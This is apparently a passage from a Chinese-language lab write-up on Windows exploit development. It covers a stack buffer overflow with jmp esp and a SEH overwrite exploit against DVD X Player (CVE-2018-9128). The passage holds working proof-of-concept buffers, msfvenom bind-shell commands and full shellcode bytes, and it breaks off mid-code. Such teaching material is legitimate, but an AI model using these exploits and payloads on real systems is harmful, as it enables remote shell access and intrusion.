<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241211155908715.png" alt="image-20241211155908715"></p>
<p>再修改 poc 为</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b"A"</span>*<span class="number">2003</span>+ <span class="string">b"BBBB"</span> + <span class="string">b"C"</span>*(<span class="number">5004</span>-<span class="number">2003</span>-<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>运行</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241211203939113.png" alt="image-20241211203939113"></p>
<p>可以看到此时 EIP= <code>42424242</code></p>
<h3 id="查找jmp-esp-指令"><a class="markdownIt-Anchor" href="#查找jmp-esp-指令">#</a> 查找 jmp esp 指令</h3>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona jmp -r esp </span><br></pre></td></tr></tbody></table></figure>
<p>在  <code>immunitydbg</code>  的目录下，文件名 <code>jmp.txt</code>  , 取其中一个地址 <code>625011af</code></p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241211204615285.png" alt="image-20241211204615285"></p>
<p>修改 poc 为</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b"A"</span>*<span class="number">2003</span>+ <span class="string">b"\xaf\x11\x50\x62"</span> + <span class="string">b"C"</span>*(<span class="number">5004</span>-<span class="number">2003</span>-<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>同时在 <code>625911af</code>  下断点，运行 poc，发现程序果然断在 <code>625911af</code></p>
<h3 id="确认坏字节-2"><a class="markdownIt-Anchor" href="#确认坏字节-2">#</a> 确认坏字节</h3>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona ba -b "\x00"</span><br></pre></td></tr></tbody></table></figure>
<p>根目录生成内容为坏字节的文件</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">badchar=(</span><br><span class="line"><span class="string">b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</span></span><br><span class="line"><span class="string">b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</span></span><br><span class="line"><span class="string">b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span></span><br><span class="line"><span class="string">b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</span></span><br><span class="line"><span class="string">b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</span></span><br><span class="line"><span class="string">b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</span></span><br><span class="line"><span class="string">b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</span></span><br><span class="line"><span class="string">b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span></span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure>
<p>赋值给 badchar，再修改 poc 为</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b"A"</span>*<span class="number">2003</span>+ <span class="string">b"\xaf\x11\x50\x62"</span> + badchar + <span class="string">b"C"</span>*(<span class="number">5004</span>-<span class="number">2003</span>-<span class="number">4</span>-<span class="built_in">len</span>(badchar))</span><br></pre></td></tr></tbody></table></figure>
<p>运行 poc，程序崩溃，查看此时堆中字节</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241211205929803.png" alt="image-20241211205929803"></p>
<p>没有 00 字节（没有额外的坏字节），那么坏字节就只有 <code>\x00</code></p>
<h3 id="编写shellcode-2"><a class="markdownIt-Anchor" href="#编写shellcode-2">#</a> 编写 shellcode</h3>
<p>kali 输入生成 <code>shellcode</code>  命令</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_bind_tcp EXITfunc=thread -b "\x00" -f python</span><br></pre></td></tr></tbody></table></figure>
<p>buf 内容如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">buf =  <span class="string">b""</span></span><br><span class="line">buf += <span class="string">b"\xdd\xc1\xd9\x74\x24\xf4\xb8\xb1\xda\x39\x4c\x5a"</span></span><br><span class="line">buf += <span class="string">b"\x2b\xc9\xb1\x53\x83\xea\xfc\x31\x42\x13\x03\xf3"</span></span><br><span class="line">buf += <span class="string">b"\xc9\xdb\xb9\x0f\x05\x99\x42\xef\xd6\xfe\xcb\x0a"</span></span><br><span class="line">buf += <span class="string">b"\xe7\x3e\xaf\x5f\x58\x8f\xbb\x0d\x55\x64\xe9\xa5"</span></span><br><span class="line">buf += <span class="string">b"\xee\x08\x26\xca\x47\xa6\x10\xe5\x58\x9b\x61\x64"</span></span><br><span class="line">buf += <span class="string">b"\xdb\xe6\xb5\x46\xe2\x28\xc8\x87\x23\x54\x21\xd5"</span></span><br><span class="line">buf += <span class="string">b"\xfc\x12\x94\xc9\x89\x6f\x25\x62\xc1\x7e\x2d\x97"</span></span><br><span class="line">buf += <span class="string">b"\x92\x81\x1c\x06\xa8\xdb\xbe\xa9\x7d\x50\xf7\xb1"</span></span><br><span class="line">buf += <span class="string">b"\x62\x5d\x41\x4a\x50\x29\x50\x9a\xa8\xd2\xff\xe3"</span></span><br><span class="line">buf += <span class="string">b"\x04\x21\x01\x24\xa2\xda\x74\x5c\xd0\x67\x8f\x9b"</span></span><br><span class="line">buf += <span class="string">b"\xaa\xb3\x1a\x3f\x0c\x37\xbc\x9b\xac\x94\x5b\x68"</span></span><br><span class="line">buf += <span class="string">b"\xa2\x51\x2f\x36\xa7\x64\xfc\x4d\xd3\xed\x03\x81"</span></span><br><span class="line">buf += <span class="string">b"\x55\xb5\x27\x05\x3d\x6d\x49\x1c\x9b\xc0\x76\x7e"</span></span><br><span class="line">buf += <span class="string">b"\x44\xbc\xd2\xf5\x69\xa9\x6e\x54\xe6\x1e\x43\x66"</span></span><br><span class="line">buf += <span class="string">b"\xf6\x08\xd4\x15\xc4\x97\x4e\xb1\x64\x5f\x49\x46"</span></span><br><span class="line">buf += <span class="string">b"\x8a\x4a\x2d\xd8\x75\x75\x4e\xf1\xb1\x21\x1e\x69"</span></span><br><span class="line">buf += <span class="string">b"\x13\x4a\xf5\x69\x9c\x9f\x60\x61\x3b\x70\x97\x8c"</span></span><br><span class="line">buf += <span class="string">b"\xfb\x20\x17\x3e\x94\x2a\x98\x61\x84\x54\x72\x0a"</span></span><br><span class="line">buf += <span class="string">b"\x2d\xa9\x7d\x25\xf2\x24\x9b\x2f\x1a\x61\x33\xc7"</span></span><br><span class="line">buf += <span class="string">b"\xd8\x56\x8c\x70\x22\xbd\xa4\x16\x6b\xd7\x73\x19"</span></span><br><span class="line">buf += <span class="string">b"\x6c\xfd\xd3\x8d\xe7\x12\xe0\xac\xf7\x3e\x40\xb9"</span></span><br><span class="line">buf += <span class="string">b"\x60\xb4\x01\x88\x11\xc9\x0b\x7a\xb1\x58\xd0\x7a"</span></span><br><span class="line">buf += <span class="string">b"\xbc\x40\x4f\x2d\xe9\xb7\x86\xbb\x07\xe1\x30\xd9"</span></span><br><span class="line">buf += <span class="string">b"\xd5\x77\x7a\x59\x02\x44\x85\x60\xc7\xf0\xa1\x72"</span></span><br><span class="line">buf += <span class="string">b"\x11\xf8\xed\x26\xcd\xaf\xbb\x90\xab\x19\x0a\x4a"</span></span><br><span class="line">buf += <span class="string">b"\x62\xf5\xc4\x1a\xf3\x35\xd7\x5c\xfc\x13\xa1\x80"</span></span><br><span class="line">buf += <span class="string">b"\x4d\xca\xf4\xbf\x62\x9a\xf0\xb8\x9e\x3a\xfe\x13"</span></span><br><span class="line">buf += <span class="string">b"\x1b\x5a\x1d\xb1\x56\xf3\xb8\x50\xdb\x9e\x3a\x8f"</span></span><br><span class="line">buf += <span class="string">b"\x18\xa7\xb8\x25\xe1\x5c\xa0\x4c\xe4\x19\x66\xbd"</span></span><br><span class="line">buf += <span class="string">b"\x94\x32\x03\xc1\x0b\x32\x06"</span></span><br></pre></td></tr></tbody></table></figure>
<p>再修改 poc 如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b"A"</span>*<span class="number">2003</span>+ <span class="string">b"\xaf\x11\x50\x62"</span> + <span class="string">b"\x90"</span>*<span class="number">10</span> +buf +<span class="string">b"\x90"</span>*<span class="number">10</span>+ <span class="string">b"C"</span>*(<span class="number">5004</span>-<span class="number">2003</span>-<span class="number">4</span>-<span class="built_in">len</span>(buf)-<span class="number">20</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>运行 poc，发现服务器接收到了攻击机 ip 的连接，再 <code>netstat -a</code>  查看端口开放状态</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241211210609322.png" alt="image-20241211210609322"></p>
<p>发现 4444 端口处于开放监听状态</p>
<p>直接 kali nc 连接</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241211210632001.png" alt="image-20241211210632001"></p>
<p>成功连接，拿到了靶机的 shell</p>
<h2 id="基于文件格式fuzz及seh漏洞利用"><a class="markdownIt-Anchor" href="#基于文件格式fuzz及seh漏洞利用">#</a> 基于文件格式 Fuzz 及 SEH 漏洞利用</h2>
<h3 id="实验介绍实践内容"><a class="markdownIt-Anchor" href="#实验介绍实践内容">#</a> 实验介绍实践内容</h3>
<p>针对 DVD X player 5.5.3.7/5.5.3.9 的  <code>CVE-2018-9128</code>  漏洞，使用  <code>FileFuzz</code>  进行漏洞 挖掘、分析和利用</p>
<h3 id="触发漏洞"><a class="markdownIt-Anchor" href="#触发漏洞">#</a> 触发漏洞</h3>
<p>创建一个内容为 AA 的 <code>test.plf</code>  文件，利用 <code>filefuzz</code> ，生成 100 个模糊测试文件，分别为 0.plf…99.plf；生成规则为两 个 AA ，生成一个 A ，100*100，即每一次增加 100 个字符，创建 100 个文件。</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241212163308228.png" alt="image-20241212163308228"></p>
<p>生成之后用 <code>dvdplayer</code>  来播放这些文件</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241212163946194.png" alt="image-20241212163946194"></p>
<p>播放到 <code>02.plf</code>  时出现了报错，</p>
<p>放到 <code>immunitydbg</code>  再来看看，从 <code>02.plf</code>  开始程序崩溃报错，但是此时数据没有覆盖到 SEH，一直加载到第 <code>06.plf</code></p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241212165824459.png" alt="image-20241212165824459"></p>
<p>此时发现覆盖到了 SEH，查看 VIEW—SEH chain, 已经被覆盖，此时意味着可以使用 SEH 利用来 实现 Exploit。</p>
<h3 id="创建poc"><a class="markdownIt-Anchor" href="#创建poc">#</a> 创建 POC</h3>
<p>python 构建 poc.py 内容如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">"dvdPoc.plf"</span> </span><br><span class="line">buffer = <span class="string">"A"</span>*<span class="number">702</span> </span><br><span class="line">textfile = <span class="built_in">open</span>(filename, <span class="string">'w'</span>) </span><br><span class="line">textfile.write(buffer) </span><br><span class="line">textfile.close() </span><br></pre></td></tr></tbody></table></figure>
<p>生成可以触发漏洞并且能覆盖到 SEH 的 <code>dvdPoc.plf</code>  文件</p>
<p>再用 <code>immunitydbg</code>  加载 dvdplayer 来打开这个 <code>dvdPoc.plf</code>  文件</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241212171240676.png" alt="image-20241212171240676"></p>
<p>发现确实是覆盖了 SEH，SEH=41414141，即成功触发了漏洞，验证了漏洞的存在。</p>
<h3 id="利用短跳技术控制程序执行流程"><a class="markdownIt-Anchor" href="#利用短跳技术控制程序执行流程">#</a> 利用短跳技术控制程序执行流程</h3>
<p><code>!mona pc 702</code>  生成唯一字符串如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3</span><br></pre></td></tr></tbody></table></figure>
<p>替换 <code>poc.plf</code>  文件内容，然后再导入一次 <code>poc.plf</code></p>
<p>运行，程序报错  <code>!mona findmsp</code>  指令查看一下结果（ <code>immunitydbg</code>  也能看到有但是点费眼睛，为了方便就在导出来的 txt 里面看了）</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241212172752415.png" alt="image-20241212172752415"></p>
<p>可以看到此时 SEH 的偏移为 608 字节，其数据为 <code>0x33754132</code></p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241212173114178.png" alt="image-20241212173114178"></p>
<p>由于 SEH 是占用了 8 个字节的，低 4 字节存储的是 NSEH 的指针，高 4 字节存储的是本 次的 SEH 函数指针；这里的 <code>0x33754132</code>  对应的是存放 NSEH 指针的地址，对应的 SEH 函数指 针应该在紧挨着的高 4 字节上，查看栈空间和 SEH 链表，确实此时的 SEH 函数指针为  <code>0x41347541</code> ，在紧挨着的高 4 字节上。</p>
<p>重新修改 <code>poc.py</code>  的内容</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nseh = <span class="string">"\x42\x42\x42\x42"</span>  </span><br><span class="line">seh = <span class="string">"\x43\x43\x43\x43"</span>  </span><br><span class="line">buffer = <span class="string">"\x41"</span>*<span class="number">608</span> + nseh +seh + <span class="string">"\x44"</span>*(<span class="number">702</span>-<span class="number">608</span>-<span class="number">4</span>-<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>再运行新生成的 plf 文件，程序报错，查看此时 SEH 内容</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241212201445436.png" alt="image-20241212201445436"></p>
<p>发现精准覆盖，此时栈中的 NSEH 内容为 42424242，SEH 内容为 43434343， 接下来就都是 4444444</p>
<h3 id="seh利用"><a class="markdownIt-Anchor" href="#seh利用">#</a> SEH 利用</h3>
<p>运行 <code>!mona seh</code>  命令搜索内存空间，查找可用的指令序列，找到了多条</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241212202427389.png" alt="image-20241212202427389"></p>
<p>取用第一条指令的地址 <code>6164172e</code> ，对应指令为 pop ecx # pop ecx # ret 0x08</p>
<p>将 seh 赋值，seh= <code>"\x2e\x17\x64\x61"</code> ，运行 <a target="_blank" rel="noopener" href="http://dvdPoc.py">dvdPoc.py</a>，重新生成  <code>DVDPoc.plf</code> ，运行 DVDX Player，在内存  <code>0x6164172e</code>  处设断点，然后加载 <code>DVDPoc.plf</code> ，程序崩溃，按 ALT+F9， 忽略冲突，程序果然运行到 <code>0x6164172e</code>  处停下来，继续跟踪运行，程序在 ret 后，加载 NSEH 在栈中的地址到 EIP 中。</p>
<p>将 shellcode 加载到缓存空间的高地址，即栈中比 SEH 更高的地址空间中，SEH 的后面， 但是由于这里的缓存只设置了 702 个空间，SEH 的偏移已经到了 608 个空间，所以后面的空 间不够放，可以有两种解决办法：</p>
<ul>
<li>可以尝试扩大 <code>DVDPoc.plf</code>  文件为 1002 个字节，尝试 看看是否可行；</li>
<li>可以保持 702 个空间的情况下，将 shellcode 放在 NSEH 前面的空间，即 低地址空间。</li>
</ul>
<p>下面是第一种方法  实现短跳的技术，在 <code>immunitydbg</code>  中输入 jmp address，会出现短跳的指令；或 者在 Kali 中输入 <code>msf-nasm_shell</code> , 然后输入 <code>jmp $+60</code> , 表示跳转的相对距离为 60 个字节， 即也出现对应的汇编指令代码。本实践是要跳过 NSEH 和 SEH 即可，将 shellcode 放在 seh 后面，因此跳转指令为 jmp 06 即可，表示相对 NSEH 的下一跳指令的地址跳过 6 个字节，则刚好跳到 SEH 的后面。则修改  <code>dvdPoc.py</code> :</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nseh = <span class="string">"\xEB\x06\x90\x90"</span>   </span><br><span class="line">seh = <span class="string">"\x2e\x17\x64\x61"</span>   </span><br><span class="line">buffer = <span class="string">"\x41"</span>*<span class="number">608</span> + nseh +seh + <span class="string">"\x44"</span>*(<span class="number">1002</span>-<span class="number">608</span>-<span class="number">4</span>-<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>生成 <code>DVDPoc.plf</code> ，运行 DVDX Player 程序，在 <code>0x6164172e</code>  处下断点，导入 <code>DVDPoc.plf</code> ， 程序崩溃，按 SHIFT+F9 忽略，程序在断点处停下来，继续单步跟踪，程序运行 EB06，跳到  <code>"\x44\x44\x44\x44"</code> ，即 shellcode 的位置。</p>
<h3 id="坏字节分析"><a class="markdownIt-Anchor" href="#坏字节分析">#</a> 坏字节分析</h3>
<p>如下指令生成坏字节字符串</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona ba -b "\x00"</span><br></pre></td></tr></tbody></table></figure>
<p>然后一样生成的字符串赋值给 badchar</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">badchar=(</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</span></span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</span></span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span></span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</span></span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</span></span><br><span class="line"><span class="string">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</span></span><br><span class="line"><span class="string">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</span></span><br><span class="line"><span class="string">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span></span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure>
<p>然后修改 poc 为</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="string">"\x41"</span>*<span class="number">608</span> + nseh + seh + <span class="string">"\x90"</span>*<span class="number">8</span>+badchar +<span class="string">"\x90"</span>*<span class="number">8</span>+<span class="string">"\x44"</span>*(<span class="number">1002</span>-<span class="number">608</span>-<span class="number">4</span>-<span class="number">4</span>-<span class="built_in">len</span>(badchar)-<span class="number">8</span>*<span class="number">2</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>再运行 <code>dvdplayer</code>  导入生成的 <code>dvdPoc.plf</code>  依次分析出 <code>\x0a</code>  和 <code>\x1a</code>  为坏字节</p>
<h3 id="编写shellcode-3"><a class="markdownIt-Anchor" href="#编写shellcode-3">#</a> 编写 shellcode</h3>
<p>根据得到的坏字节，使用如下命令得到 buf 的值</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_bind_tcp EXITfunc=thread -b "\x00\x0a\x1a" -f python</span><br></pre></td></tr></tbody></table></figure>
<p>根据生成的 buf 内容最终修改 poc.py 如下，运行生成包含 shellcode 的 <code>dvdPoc.plf</code> （还是得用字节拼接</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 